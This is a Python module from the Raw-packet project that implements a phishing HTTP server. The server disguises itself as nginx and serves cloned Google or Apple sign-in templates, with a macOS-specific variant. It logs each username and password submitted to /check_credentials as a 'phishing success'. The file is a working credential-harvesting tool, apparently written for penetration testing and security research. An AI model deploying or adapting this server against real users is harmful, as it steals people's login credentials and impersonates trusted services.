# region Description
"""
phishing.py: Phishing HTTP server (phishing)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import List, Dict, Tuple, Callable
from json import loads, decoder
from user_agents import parse as user_agent_parse
from os.path import abspath, dirname, isdir, isfile, join
from os import listdir
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
__script_name__ = 'Make phishing HTTP pages (phishing)'
# endregion


# region Phishing HTTP Request Handler
class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):

    BaseHTTPRequestHandler.server_version = 'nginx'
    BaseHTTPRequestHandler.sys_version = ''

    # region Errors
    def error_SendResponse(self, error_code: int):
        self.send_response(error_code)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        full_path: str = join(self.server.site_path + self.server.separator + 'errors' +
                              self.server.separator + str(error_code) + '.html')
        if isfile(full_path):
            self.wfile.write(open(full_path, 'rb').read())
        else:
            self.wfile.write(bytes(string='<html>ERROR</html>', encoding='utf-8'))

    def error_BadRequest(self):
        self.error_SendResponse(error_code=400)

    def error_FileNotFound(self):
        self.error_SendResponse(error_code=404)

    def error_NeedContentLegth(self):
        self.error_SendResponse(error_code=411)

    def error_CheckCreds(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(bytes('ERROR', 'utf-8'))
    # endregion

    # region GET request
    def do_GET(self):

        if 'User-Agent' not in self.headers:
            self.error_BadRequest()
        else:
            user_agent: str = self.headers['User-Agent']

        device = user_agent_parse(user_agent)
        os = device.os.family

        if self.server.site_path.endswith(self.server.separator + 'apple') and os == 'MacOS':
            self.server.site_path += self.server.separator + 'macos_native'

        if self.server.separator == '\\':
            path: str = self.path.replace('/', '\\')
        else:
            path: str = self.path

        if path == self.server.separator:
            full_path: str = join(self.server.site_path + self.server.separator + 'index.html')
        else:
            full_path: str = join(self.server.site_path + self.path)

        content_type: str = 'text/html'
        if full_path.endswith('.html'):
            content_type = 'text/html'
        elif full_path.endswith('.ico'):
            content_type = 'image/x-icon'
        elif full_path.endswith('.js'):
            content_type = 'text/javascript'
        elif full_path.endswith('.css'):
            content_type = 'text/css'
        elif full_path.endswith('.ttf'):
            content_type = 'font/ttf'
        elif full_path.endswith('.woff'):
            content_type = 'font/woff'
        elif full_path.endswith('.woff2'):
            content_type = 'font/woff2'
        elif full_path.endswith('.eot'):
            content_type = 'application/vnd.ms-fontobject'
        elif full_path.endswith('.gif'):
            content_type = 'image/gif'
        elif full_path.endswith('.png'):
            content_type = 'image/png'
        elif full_path.endswith('.svg'):
            content_type = 'image/svg+xml'
        elif full_path.endswith('.jpg') or full_path.endswith('.jpeg'):
            content_type = 'image/jpeg'
        elif full_path.endswith('.tif') or full_path.endswith('.tiff'):
            content_type = 'image/tiff'
        if full_path.endswith('.py'):
            self.error_FileNotFound()
        if full_path.endswith('.php'):
            self.error_FileNotFound()

        if isfile(full_path):
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.end_headers()
            self.wfile.write(open(full_path, 'rb').read())
        else:
            self.error_FileNotFound()

    # endregion

    # region POST request
    def do_POST(self):
        form: str = self.path
        if 'Content-Length' not in self.headers:
            self.error_NeedContentLegth()
        try:
            post_data: str = self.rfile.read(int(self.headers['Content-Length'])).decode('utf-8')
            post_data: Dict = loads(post_data)

            if form == '/check_username':
                self.send_response(200)
                self.end_headers()
                self.wfile.write(bytes(post_data['username'], 'utf-8'))

            elif form == '/check_credentials':
                self.server.base.print_success('Phishing success!'
                                               ' Address: ', self.address_string(),
                                               ' Username: ', post_data['username'],
                                               ' Password: ', post_data['password'])
                self.error_CheckCreds()

            else:
                self.error_FileNotFound()

        except decoder.JSONDecodeError:
            self.error_BadRequest()

        except UnicodeDecodeError:
            self.error_BadRequest()

        except KeyError:
            self.error_CheckCreds()

        except UnboundLocalError:
            self.error_CheckCreds()
    # endregion

    # region Log messages
    def log_message(self, format, *args):
        if not self.server.quiet:
            if 'User-Agent' in self.headers:
                device = user_agent_parse(self.headers['User-Agent'])
                self.server.base.print_info('Phishing client address: ', self.address_string(),
                                            ' os: ', device.os.family, ' browser: ', device.browser.family,
                                            ' request: ', '%s' % format % args)
            else:
                self.server.base.print_info('Phishing client address: ', self.address_string(),
                                            'request: ', '%s' % format % args)
    # endregion

# endregion


# region Phishing HTTP Server
class _PhishingHTTPServer(HTTPServer):
    def __init__(self,
                 server_address: Tuple[str, int],
                 RequestHandlerClass: Callable[..., BaseHTTPRequestHandler],
                 site_path: str,
                 base_instance: Base,
                 quiet: bool = False):
        super().__init__(server_address, RequestHandlerClass)
        self.site_path: str = site_path
        self.base: Base = base_instance
        self.quiet: bool = quiet
        if self.base.get_platform().startswith('Windows'):
            self.separator: str = '\\'
        else:
            self.separator: str = '/'
# endregion


# region class Phishing Server
class PhishingServer:
    """
    Phishing HTTP server (phishing)
    """

    # region Variables
    _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Start Phishing
    def start(self,
              address: str = '0.0.0.0',
              port: int = 80,
              site: str = 'google',
              quiet: bool = False):
        """
        Start Phishing HTTP server
        :param address: IPv4 address for listening (default: '0.0.0.0')
        :param port: TCP port for listening (default: 80)
        :param site: Set full path to site or site template 'apple' or 'google'
        :param quiet: Quiet mode
        :return: None
        """
        try:
            if self._base.get_platform().startswith('Windows'):
                separator: str = '\\'
            else:
                separator: str = '/'
            if separator in site:
                site_path = site
                assert isdir(site_path), \
                    'Could not found site path: ' + self._base.error_text(site_path)
            else:
                directories: List[str] = list()
                current_path: str = dirname(abspath(__file__))
                files: List[str] = listdir(current_path)
                for file in files:
                    path: str = join(current_path + separator + file)
                    if isdir(path):
                        directories.append(path)
                site_path: str = join(current_path + separator + site)
                assert site_path in directories, \
                    'Could not found site template: ' + self._base.error_text(site) + \
                    ' in templates directory: ' + self._base.info_text(current_path)

            httpd = _PhishingHTTPServer(server_address=(address, port),
                                        RequestHandlerClass=_PhishingHTTPRequestHandler,
                                        site_path=site_path,
                                        base_instance=self._base,
                                        quiet=quiet)
            httpd.serve_forever()

        except KeyboardInterrupt:
            if not quiet:
                self._base.print_info('Exit')
            exit(0)

        except AssertionError as Error:
            if not quiet:
                self._base.print_error(Error.args[0])
            exit(1)

    # endregion

# endregion
